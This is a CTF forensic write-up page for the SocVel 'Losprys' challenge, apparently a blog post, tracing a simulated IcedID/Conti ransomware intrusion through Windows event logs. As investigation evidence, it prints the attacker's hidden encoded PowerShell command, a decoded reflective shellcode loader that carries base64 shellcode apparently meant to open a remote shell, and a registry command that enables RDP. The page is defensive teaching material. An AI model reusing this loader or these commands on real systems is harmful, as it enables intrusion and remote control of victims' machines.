
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <title>Losprys (DFIR, 3000) · extiop's realm</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="HonKit 3.7.5">
        
        
        
    
    <link rel="stylesheet" href="../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../gitbook/@honkit/honkit-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="dikbek.html" />
    
    
    <link rel="prev" href="../" />
    

    </head>
    <body>
        
<div class="book honkit-cloak">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../">
            
                <a href="../../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../../">
            
                <a href="../../">
            
                    
                    2021
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../../CSAW-CTF-Quals/">
            
                <a href="../../CSAW-CTF-Quals/">
            
                    
                      CSAW CTF Quals
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../../CSAW-CTF-Quals/ics/tripping_breakers.html">
            
                <a href="../../CSAW-CTF-Quals/ics/tripping_breakers.html">
            
                    
                    Tripping Breakers (malware analysis, 481)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../../FwordCTF/">
            
                <a href="../../FwordCTF/">
            
                    
                      FwordCTF
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../../FwordCTF/web/parrotox.html">
            
                <a href="../../FwordCTF/web/parrotox.html">
            
                    
                    ParrotOx (web, 997)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../../CyberDefenders/">
            
                <a href="../../CyberDefenders/">
            
                    
                      CyberDefenders
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="../../CyberDefenders/DFIR/honeybot.html">
            
                <a href="../../CyberDefenders/DFIR/honeybot.html">
            
                    
                    HoneyBOT (DFIR & malware analysis, 1700)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="../../CyberDefenders/forensic/wiredive.html">
            
                <a href="../../CyberDefenders/forensic/wiredive.html">
            
                    
                    WireDive (forensic, 6275)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../">
            
                <a href="../">
            
                    
                      SocVel
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="1.6.1" data-path="losprys.html">
            
                <a href="losprys.html">
            
                    
                    Losprys (DFIR, 3000)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2" data-path="dikbek.html">
            
                <a href="dikbek.html">
            
                    
                    DikBek (DFIR, 3000)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.3" data-path="pooptoria.html">
            
                <a href="pooptoria.html">
            
                    
                    Pooptoria (DFIR, 3000)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../../FCSC/">
            
                <a href="../../FCSC/">
            
                    
                      FCSC
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="../../FCSC/forensic/ordiphone-0.html">
            
                <a href="../../FCSC/forensic/ordiphone-0.html">
            
                    
                    Ordiphone0 (forensic, 42)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.2" data-path="../../FCSC/forensic/ordiphone-2.html">
            
                <a href="../../FCSC/forensic/ordiphone-2.html">
            
                    
                    Ordiphone2 (forensic, 197)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="../../NorzhCTF/">
            
                <a href="../../NorzhCTF/">
            
                    
                      NorzhCTF
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="../../NorzhCTF/airport_hall/triskel-3.html">
            
                <a href="../../NorzhCTF/airport_hall/triskel-3.html">
            
                    
                    Triskel 3 (web, 49)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="../../NorzhCTF/airport_hall/triskel-4.html">
            
                <a href="../../NorzhCTF/airport_hall/triskel-4.html">
            
                    
                    Triskel 4 (pentest & misc, 20)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="../../NorzhCTF/developer_corner/tea_time.html">
            
                <a href="../../NorzhCTF/developer_corner/tea_time.html">
            
                    
                    Tea time (pentest, 20)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.9" data-path="../../../2020/">
            
                <a href="../../../2020/">
            
                    
                    2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.10" data-path="../../../2020/FwordCTF/">
            
                <a href="../../../2020/FwordCTF/">
            
                    
                      FwordCTF
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.10.1" data-path="../../../2020/FwordCTF/web/jailoo-warmup.html">
            
                <a href="../../../2020/FwordCTF/web/jailoo-warmup.html">
            
                    
                    Jailoo Warmup (web, 442)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
            Published with HonKit
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../.." >Losprys (DFIR, 3000)</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="losprys">Losprys</h1>
<h2 id="dfir-3000-points">DFIR, 3000 points</h2>
<h3 id="description">Description</h3>
<p>Gerhadus Stephanos was about to switch on the computer that manages one of the largest model train ecosystems in the Southern Hemisphere. However, just before he could, IT came running in. An apparent &quot;cyber security&quot; event at the company had forced them to shut down all systems. Sounds like a ransomware event, or &quot;losprysware&quot; in Afrikaans...
Can you help solve what happened? Gerhardus really needs the model trains up and running again...</p>
<p>For more information, check the <a href="https://socvel.com/losprys.html#Losprys" target="_blank">Losprys scenario backstory</a>.</p>
<p>Author: <a href="https://twitter.com/socveldotcom" target="_blank">SocVel</a></p>
<h3 id="ranking">Ranking</h3>
<p><img src="images/august_2021_scoreboard.png" alt="August 2021 scoreboard"></p>
<p>With this new mission that was published a few days ago, I managed to climb the rankings to reach the first place in the <a href="https://ctf.socvel.com/scoreboard" target="_blank">scoreboard</a>.</p>
<p>Hopefully it will stay like this as I can&apos;t get any more points until a new challenge is published.</p>
<h3 id="solution">Solution</h3>
<p>For this lab, I will explain my investigation work regarding this ransomware attack. To break down this exercise, I will focus on interesting questions asked in this SocVel&apos;s challenge. Thus, some questions might be omitted.</p>
<p>Most of the logs for this challenge uses the <code>.evtx</code> extension which are logs managed by Windows Event Viewer, you can get more information on <a href="https://forensicswiki.xyz/wiki/index.php?title=Windows_XML_Event_Log_%28EVTX%29" target="_blank">this Forensics Wiki</a> or <a href="https://docs.logrhythm.com/docs/devices/ms-windows-event-log-sources/ms-windows-event-logging-xml-windows-defender/malware-detection-events-xml-logs" target="_blank">this LogRhythm documentation</a>. In order to deal with Windows Event Log files on my Linux operating system, I converted them into XML files with a Python script <code>evtx_dump.py</code>, available in my GitHub repository <a href="https://github.com/extiop/ctf/blob/master/2021/SocVel/DFIR/evtx_dump.py" target="_blank">there</a>.</p>
<h4 id="q3-what-section-of-the-targeted-companies-websites-were-the-attackers-using-to-deliver-malicious-links-to-victims">Q3) What section of the targeted companies&apos; websites were the attackers using to deliver malicious links to victims?</h4>
<p>Attackers delivered the <strong>Conti</strong> via, for this case, the Trojan <strong>IcedID</strong>, according to Windows Defender. You can get more information with <a href="https://thehackernews.com/2021/06/webinar-how-cyber-attack-groups-are.html" target="_blank">this article</a> from The Hacker News.</p>
<p>In this investigation, I have to dig it out a bit more. After reading <a href="https://www.microsoft.com/security/blog/2021/04/09/investigating-a-unique-form-of-email-delivery-for-icedid-malware/" target="_blank">this Microsoft blog</a>, I can state that it is through contact forms that attackers used to drop this trendy malware.</p>
<h4 id="q15-which-application-was-responsible-for-creating-the-invoicezip-file-on-the-computer">Q15) Which application was responsible for creating the Invoice.zip file on the computer?</h4>
<p>I jump directly to this question as it is interesting to make the link here. From the previous response, I noticed that contact forms were used, hence, very probably, these forms are sent through email to the company, let&apos;s see if I am right.</p>
<p>I search for <code>Invoice.zip</code> in the Sysmon logs:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;Image&quot;</span>&gt;</span>C:\Program Files (x86)\Microsoft Office\root\Office16\OUTLOOK.EXE<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;TargetFilename&quot;</span>&gt;</span>C:\Users\finance\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\O5GLAIMK\Invoice.zip<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
</code></pre>
<p>I hit the bull&apos;s-eye, Outlook is the bad guy.</p>
<h4 id="q16-it-appears-that-the-attackers-were-able-to-remotely-install-a-malicious-service-on-the-host-with-their-new-found-urgency-what-was-the-name-of-the-first-malicious-service-installed-on-the-host-following-the-icedid-infection">Q16) It appears that the attackers were able to remotely install a malicious service on the host with their new-found urgency. What was the name of the first malicious service installed on the host following the IcedID infection?</h4>
<p>At this moment, I know that <code>IEUDLK.CJF</code>, the IcedID file, was dropped in the system at <code>2021-07-23 14:17:37</code> by a user named <code>finance</code> and his computer name is <code>fin-desktop</code>. Also, this file has been run by <code>rundll32.exe</code>.</p>
<p>I looked for <code>powershell</code> entries and got this interesting one:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ParentImage&quot;</span>&gt;</span>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ParentCommandLine&quot;</span>&gt;</span>&quot;C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe&quot; -noni -nop -w hidden -c <span class="hljs-symbol">&amp;amp;</span>([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&apos;H4[...]42EKAAA=&apos;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
</code></pre>
<p>Afterwards, I thought that Powershell was creating some services in this weird base64 payload. I documented myself with <a href="https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html" target="_blank">this definition</a> and looked for events with an ID equals to 7045 in the <code>System.xml</code> file:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">EventID</span> <span class="hljs-attr">Qualifiers</span>=<span class="hljs-string">&quot;16384&quot;</span>&gt;</span>7045<span class="hljs-tag">&lt;/<span class="hljs-name">EventID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">TimeCreated</span> <span class="hljs-attr">SystemTime</span>=<span class="hljs-string">&quot;2021-07-23 14:24:26.616776&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TimeCreated</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">EventRecordID</span>&gt;</span>2367<span class="hljs-tag">&lt;/<span class="hljs-name">EventRecordID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Channel</span>&gt;</span>System<span class="hljs-tag">&lt;/<span class="hljs-name">Channel</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Computer</span>&gt;</span>fin-desktop<span class="hljs-tag">&lt;/<span class="hljs-name">Computer</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">System</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">EventData</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ServiceName&quot;</span>&gt;</span>ipexXNOzRNIWyzHO<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
</code></pre>
<p>The timestamp suits as it is after the IcedID file drop and it creates indeed a service: it is my winner.</p>
<h4 id="q18-we-need-to-understand-what-this-service-was-doing-you-can-easily-pull-apart-the-encoded-sections-with-cyberchef-once-successfully-decoded-youll-see-the-first-function-is-named-pvxrl-what-is-the-name-of-the-second-funtion">Q18) We need to understand what this service was doing. You can easily pull apart the encoded sections with CyberChef. Once successfully decoded, you&apos;ll see the first function is named &quot;pvXRL&quot;. What is the name of the second funtion?</h4>
<p>A little CyberChef here, when I decode this base64 payload with a simple <em>From Base64</em> recipe, I get a hint from CyberChef which suggests to detect the file type, which means there is a magic number detected by Cyberchef, this tool is absolutely great, thank you <a href="https://www.gchq.gov.uk/" target="_blank">UK&apos;s intelligence and cyber agency</a>. Indeed, it detected the magic number <code>1f 8b</code> which seems to lead to a <code>gzip</code> file according to <a href="https://en.wikipedia.org/wiki/Gzip" target="_blank">Wikipedia</a>. I crafted a bit more my recipe to end with <a href="https://tinyurl.com/3423634j" target="_blank">this one</a> to get the injected payload.</p>
<p>At last, I get the name of the second function:</p>
<pre><code class="lang-powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pvXRl</span></span> {
    <span class="hljs-keyword">Param</span> (<span class="hljs-variable">$uBmj3</span>, <span class="hljs-variable">$ijh</span>)        
    <span class="hljs-variable">$mwUs</span> = ([<span class="hljs-type">AppDomain</span>]::CurrentDomain.GetAssemblies() | <span class="hljs-built_in">Where-Object</span> { <span class="hljs-variable">$_</span>.GlobalAssemblyCache <span class="hljs-operator">-And</span> <span class="hljs-variable">$_</span>.Location.Split(<span class="hljs-string">&apos;\\&apos;</span>)[-<span class="hljs-number">1</span>].Equals(<span class="hljs-string">&apos;System.dll&apos;</span>) }).GetType(<span class="hljs-string">&apos;Microsoft.Win32.UnsafeNativeMethods&apos;</span>)

    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mwUs</span>.GetMethod(<span class="hljs-string">&apos;GetProcAddress&apos;</span>, [<span class="hljs-type">Type</span>[]]<span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>], [<span class="hljs-built_in">String</span>])).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>](<span class="hljs-built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="hljs-built_in">New-Object</span> IntPtr), (<span class="hljs-variable">$mwUs</span>.GetMethod(<span class="hljs-string">&apos;GetModuleHandle&apos;</span>)).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$uBmj3</span>)))), <span class="hljs-variable">$ijh</span>))
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vqAE</span></span> {
    <span class="hljs-keyword">Param</span> (
        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">0</span>, <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-type">Type</span>[]] <span class="hljs-variable">$kZ51</span>,
        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)] [<span class="hljs-type">Type</span>] <span class="hljs-variable">$mZX</span> = [<span class="hljs-built_in">Void</span>]
    )

    <span class="hljs-variable">$lj5</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="hljs-built_in">New-Object</span> System.Reflection.AssemblyName(<span class="hljs-string">&apos;ReflectedDelegate&apos;</span>)), [<span class="hljs-type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="hljs-string">&apos;InMemoryModule&apos;</span>, <span class="hljs-variable">$false</span>).DefineType(<span class="hljs-string">&apos;MyDelegateType&apos;</span>, <span class="hljs-string">&apos;Class, Public, Sealed, AnsiClass, AutoClass&apos;</span>, [<span class="hljs-type">System.MulticastDelegate</span>])
    <span class="hljs-variable">$lj5</span>.DefineConstructor(<span class="hljs-string">&apos;RTSpecialName, HideBySig, Public&apos;</span>, [<span class="hljs-type">System.Reflection.CallingConventions</span>]::Standard, <span class="hljs-variable">$kZ51</span>).SetImplementationFlags(<span class="hljs-string">&apos;Runtime, Managed&apos;</span>)
    <span class="hljs-variable">$lj5</span>.DefineMethod(<span class="hljs-string">&apos;Invoke&apos;</span>, <span class="hljs-string">&apos;Public, HideBySig, NewSlot, Virtual&apos;</span>, <span class="hljs-variable">$mZX</span>, <span class="hljs-variable">$kZ51</span>).SetImplementationFlags(<span class="hljs-string">&apos;Runtime, Managed&apos;</span>)

    <span class="hljs-keyword">return</span> <span class="hljs-variable">$lj5</span>.CreateType()
}

[<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$hhg</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&quot;/OiPAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcdJde9Si1IQi0I8AdCLQHhXhcB0TAHQi0gYUItYIAHThcl0PDH/SYs0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoCgoKY2gCAAG7ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V&quot;</span>)

<span class="hljs-variable">$np</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((pvXRl kernel32.dll VirtualAlloc), (vqAE <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]))).Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero, <span class="hljs-variable">$hhg</span>.Length,<span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)
[<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$hhg</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$np</span>, <span class="hljs-variable">$hhg</span>.length)

<span class="hljs-variable">$f5AM0</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((pvXRl kernel32.dll CreateThread), (vqAE <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]))).Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero,<span class="hljs-number">0</span>,<span class="hljs-variable">$np</span>,[<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero,<span class="hljs-number">0</span>,[<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero)
[<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((pvXRl kernel32.dll WaitForSingleObject), (vqAE <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-built_in">Int</span><span class="hljs-type">32</span>]))).Invoke(<span class="hljs-variable">$f5AM0</span>,<span class="hljs-number">0</span>xffffffff) | <span class="hljs-built_in">Out-Null</span>
</code></pre>
<h4 id="q21-the-attackers-edited-the-value-of-a-specific-registry-key-in-order-to-enable-rdp-connections-to-the-host-what-was-the-new-value-assigned-to-the-key">Q21) The attackers edited the value of a specific registry key in order to enable RDP connections to the host. What was the new value assigned to the key?</h4>
<p>What is the event ID when one set a new value to a registry? <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90013" target="_blank">This great site</a> answered me and it is <code>13</code>. After some searches, I got these events that follow each other:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">EventID</span> <span class="hljs-attr">Qualifiers</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">EventID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">TimeCreated</span> <span class="hljs-attr">SystemTime</span>=<span class="hljs-string">&quot;2021-07-23 14:38:15.695042&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TimeCreated</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Channel</span>&gt;</span>Microsoft-Windows-Sysmon/Operational<span class="hljs-tag">&lt;/<span class="hljs-name">Channel</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Computer</span>&gt;</span>fin-desktop<span class="hljs-tag">&lt;/<span class="hljs-name">Computer</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;UtcTime&quot;</span>&gt;</span>2021-07-23 14:38:15.688<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;Image&quot;</span>&gt;</span>C:\Windows\SysWOW64\reg.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;Description&quot;</span>&gt;</span>Registry Console Tool<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;OriginalFileName&quot;</span>&gt;</span>reg.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;CommandLine&quot;</span>&gt;</span>reg  add &quot;hklm\system\currentControlSet\Control\Terminal Server&quot; /v &quot;fDenyTSConnections&quot; /t REG_DWORD /d 0x0 /f<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;CurrentDirectory&quot;</span>&gt;</span>C:\Windows\system32\<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ParentProcessId&quot;</span>&gt;</span>8740<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ParentImage&quot;</span>&gt;</span>C:\Windows\SysWOW64\cmd.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">EventID</span> <span class="hljs-attr">Qualifiers</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>13<span class="hljs-tag">&lt;/<span class="hljs-name">EventID</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">TimeCreated</span> <span class="hljs-attr">SystemTime</span>=<span class="hljs-string">&quot;2021-07-23 14:38:15.706722&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TimeCreated</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Channel</span>&gt;</span>Microsoft-Windows-Sysmon/Operational<span class="hljs-tag">&lt;/<span class="hljs-name">Channel</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Computer</span>&gt;</span>fin-desktop<span class="hljs-tag">&lt;/<span class="hljs-name">Computer</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">EventData</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;RuleName&quot;</span>&gt;</span>ModifyRemoteDesktopState<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;EventType&quot;</span>&gt;</span>SetValue<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;UtcTime&quot;</span>&gt;</span>2021-07-23 14:38:15.701<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ProcessId&quot;</span>&gt;</span>6800<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;Image&quot;</span>&gt;</span>C:\Windows\SysWOW64\reg.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;TargetObject&quot;</span>&gt;</span>HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
</code></pre>
<p>Thereby, I can read the new key value.</p>
<h4 id="q22-the-attackers-enabled-a-specific-firewall-rule-group-on-the-host-which-port-would-have-been-opened-due-to-this-change">Q22) The attackers enabled a specific Firewall rule group on the host. Which port would have been opened due to this change?</h4>
<p>At first, I was still looking at <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia" target="_blank">this website</a> for events dealing with firewall changes. I looked up in the logs for events ID equals to <code>4946</code> and <code>4950</code> and found nothing.</p>
<p>I guessed that as the new rule is dealing with Remote Desktop Protocol, it is very likely that the concerned port is <code>3389</code>. Let&apos;s gather more information to be sure of my shot. After a while, I stumbled upon this event:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;UtcTime&quot;</span>&gt;</span>2021-07-23 14:38:37.623<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;Image&quot;</span>&gt;</span>C:\Windows\SysWOW64\netsh.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;OriginalFileName&quot;</span>&gt;</span>netsh.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
